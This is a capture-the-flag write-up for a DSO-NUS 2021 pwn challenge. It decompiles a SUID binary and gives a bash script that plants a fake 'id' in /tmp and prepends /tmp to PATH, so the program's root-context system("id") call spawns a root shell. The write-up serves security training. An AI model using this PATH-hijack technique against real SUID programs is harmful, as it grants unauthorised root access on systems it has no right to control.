Exploit a program that changes user privilege to root with `setuid()` to escalate privilege. First pwn challenge from DSO-NUS 2021.

# Challenge Description
```
Someone once told me that SUID is a bad idea. Could you show me why?

This challenge server can be accessed here:

(Any one of the options below is fine)
(Suggested access via 'nc')
nc ctf-85ib.balancedcompo.site 9999
nc ctf-sn3y.balancedcompo.site 9999

*Debug the Pwn challenges locally on your system before connecting to the remote challenge server to exploit and get the flag.

# Solution

Throw the binary into ghidra and navigate to the main function. This is the decompiled main function:

```c
undefined8 FUN_00400746(void)
{
  __uid_t __uid;
  __uid_t __uid_00;
  int iVar1;
  undefined8 uVar2;
  
  __uid = getuid();
  puts("I am a SUID binary and can run in varying levels of privilege!");
  puts("\nNow, I run in a less privileged context.");
  system("id");
  __uid_00 = geteuid();
  iVar1 = setuid(__uid_00);
  if (iVar1 == 0) {
    puts("\nNext, I wil run in a more privileged context.");
    system("id");
    setuid(__uid);
    puts("\nOnce I am done, as a good practice, I should return my privileges.");
    puts("And I run in a less privileged context again.");
    system("id");
    uVar2 = 0;
  }
  else {
    printf("Eh? Something went wrong leh.");
    printf("Can contact some geeks about this? Thanks!");
    perror("seteuid");
    uVar2 = 0xffffffff;
  }
  return uVar2;
}
```

There's no input taken, hmm... Since I had no idea on what to do at this point, I connected to their server via nc and looked around.

In the root directory, there's a `flag.txt` but it can only be read with root privilege. Another useful information is that all the files and folders do not have write permission for the current user except for `/tmp`. So we need to perform privilege escalation by using the second `system("id")` in the program to spawn a shell with root privilege.

To do this, we can create a script in `/tmp` to replace the original `id` script such that it calls `/bin/bash` the second time it is called. Finally, to make sure that `system("id")` properly calls our script, we need to `chmod +x` and add the directory to `PATH`.

# Final Script
```bash
echo "#!/bin/bash
/tmp/layer;" > /tmp/id

echo "#!/bin/bash
echo '#!/bin/bash
/bin/bash;' > /tmp/id" > /tmp/layer

chmod +x /tmp/id

chmod +x /tmp/layer

export PATH=/tmp:$PATH

cat flag.txt
```
